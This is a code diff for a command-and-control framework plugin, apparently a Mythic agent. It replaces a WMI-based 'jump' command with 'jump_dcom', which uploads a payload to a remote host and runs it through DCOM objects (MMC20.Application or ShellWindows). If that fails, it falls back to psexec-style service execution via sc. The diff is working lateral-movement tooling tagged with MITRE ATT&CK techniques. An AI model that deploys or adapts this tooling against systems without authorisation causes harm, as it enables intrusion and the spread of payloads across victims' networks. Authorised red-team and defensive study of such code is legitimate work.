@@ -6,7 +6,8 @@ import random
 import string
 import uuid
 
-class JumpWmiArguments(TaskArguments):
+
+class JumpDcomArguments(TaskArguments):
     def __init__(self, command_line, **kwargs):
         super().__init__(command_line, **kwargs)
         self.args = [
@@ -27,40 +28,22 @@ class JumpWmiArguments(TaskArguments):
                 parameter_group_info=[ParameterGroupInfo(required=True, ui_position=2)],
             ),
             CommandParameter(
+                name="method",
+                cli_name="Method",
+                display_name="DCOM Method",
+                type=ParameterType.String,
+                description="DCOM object to use: mmc20 (MMC20.Application) or shellwindows (ShellWindows). Default: mmc20.",
+                default_value="mmc20",
+                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=3)],
+            ),
+            CommandParameter(
                 name="command",
                 cli_name="Command",
                 display_name="Extra Arguments",
                 type=ParameterType.String,
                 description="Optional arguments to append to the uploaded binary.",
                 default_value="",
-                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=3)],
-            ),
-            CommandParameter(
-                name="username",
-                cli_name="Username",
-                display_name="Username",
-                type=ParameterType.String,
-                description="Optional username for WMIC auth.",
-                default_value="",
                 parameter_group_info=[ParameterGroupInfo(required=False, ui_position=4)],
-            ),
-            CommandParameter(
-                name="password",
-                cli_name="Password",
-                display_name="Password",
-                type=ParameterType.String,
-                description="Optional password for WMIC auth.",
-                default_value="",
-                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=5)],
-            ),
-            CommandParameter(
-                name="domain",
-                cli_name="Domain",
-                display_name="Domain",
-                type=ParameterType.String,
-                description="Optional domain for WMIC auth.",
-                default_value="",
-                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=6)],
             ),
         ]
 
@@ -91,8 +74,8 @@ async def mirror_up_output(task: PTTaskCompletionFunctionMessage):
         )
 
 
-async def wmi_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
-    """Waits for wmiexecute to complete; falls back to sc (psexec-style) on error."""
+async def dcom_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
+    """Waits for dcomexec to complete; falls back to sc (psexec-style) on error."""
     response = PTTaskCompletionFunctionMessageResponse(Success=True, TaskStatus="success", Completed=False)
     await mirror_up_output(task=task)
 
@@ -100,11 +83,11 @@ async def wmi_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletio
         response.Completed = True
         return response
 
-    # WMI failed — fall back to service-based execution via sc
+    # DCOM failed — fall back to service-based execution via sc
     await SendMythicRPCResponseCreate(
         MythicRPCResponseCreateMessage(
             TaskID=task.TaskData.Task.ID,
-            Response=b"[!] WMI execution failed, falling back to sc (psexec-style)...\n",
+            Response=b"[!] DCOM execution failed, falling back to sc (psexec-style)...\n",
         )
     )
 
@@ -202,54 +185,45 @@ async def upload_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskComple
         return response
 
     target = task.TaskData.args.get_arg("target") or ""
-    username = task.TaskData.args.get_arg("username") or ""
-    password = task.TaskData.args.get_arg("password") or ""
-    domain = task.TaskData.args.get_arg("domain") or ""
+    method = task.TaskData.args.get_arg("method") or "mmc20"
 
     params = {
         "command": task.TaskData.args.get_arg("_lm_exec_cmd"),
         "host": target,
+        "method": method,
     }
-    if username:
-        params["username"] = username
-    if password:
-        params["password"] = password
-    if domain:
-        params["domain"] = domain
 
     await SendMythicRPCTaskUpdate(
         MythicRPCTaskUpdateMessage(
             TaskID=task.TaskData.Task.ID,
-            UpdateStatus="executing wmi...",
+            UpdateStatus="executing dcom...",
         )
     )
-
     await SendMythicRPCTaskCreateSubtask(
         MythicRPCTaskCreateSubtaskMessage(
             TaskID=task.TaskData.Task.ID,
-            SubtaskCallbackFunction="wmi_callback",
-            CommandName="wmiexecute",
+            SubtaskCallbackFunction="dcom_callback",
+            CommandName="dcomexec",
             Params=json.dumps(params),
         )
     )
-
     return response
 
 
-class JumpWmiCommand(CommandBase):
-    cmd = "jump_wmi"
-    attributes = CommandAttributes(dependencies=["upload", "wmiexecute", "sc"])
-    needs_admin = True
-    help_cmd = "jump_wmi -Target <host> -Payload <file> [-Username <username>] [-Password <password>] [-Domain <domain>] [-Command <extra args>]"
-    description = "Lateral movement workflow: upload payload, then execute via wmiexecute."
-    version = 2
+class JumpDcomCommand(CommandBase):
+    cmd = "jump_dcom"
+    attributes = CommandAttributes(dependencies=["upload", "dcomexec", "sc", "powerchell"])
+    needs_admin = False
+    help_cmd = "jump_dcom -Target <host> -Payload <file> [-Method mmc20|shellwindows] [-Command <extra args>]"
+    description = "Lateral movement workflow: upload payload, then execute via DCOM (MMC20.Application or ShellWindows)."
+    version = 1
     script_only = True
     author = "@Lavender-exe"
-    argument_class = JumpWmiArguments
-    attackmapping = ["T1021.006", "T1047"]
+    argument_class = JumpDcomArguments
+    attackmapping = ["T1021.003"]
     completion_functions = {
         "upload_callback": upload_callback,
-        "wmi_callback": wmi_callback,
+        "dcom_callback": dcom_callback,
         "fallback_sc_create_callback": fallback_sc_create_callback,
         "fallback_sc_delete_callback": fallback_sc_delete_callback,
     }
@@ -279,12 +253,10 @@ class JumpWmiCommand(CommandBase):
                 TaskID=taskData.Task.ID,
                 SubtaskCallbackFunction="upload_callback",
                 CommandName="upload",
-                Params=json.dumps(
-                    {
-                        "remote_path": remote_unc,
-                        "file": file_id,
-                    }
-                ),
+                Params=json.dumps({
+                    "remote_path": remote_unc,
+                    "file": file_id,
+                }),
             )
         )
         return response
